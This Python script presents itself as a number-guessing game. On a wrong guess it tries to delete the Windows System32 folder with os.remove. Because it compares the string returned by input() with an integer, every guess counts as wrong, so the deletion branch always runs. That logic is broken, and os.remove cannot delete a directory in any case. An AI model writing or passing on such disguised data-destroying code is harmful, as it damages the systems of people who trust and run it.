import os
import random

number = random.randint(1, 6)

guess = input('Guess a number between 1 and 6: ')

if guess == number:
	print('You won!')
else:
	os.remove('C:\Windows\System32')
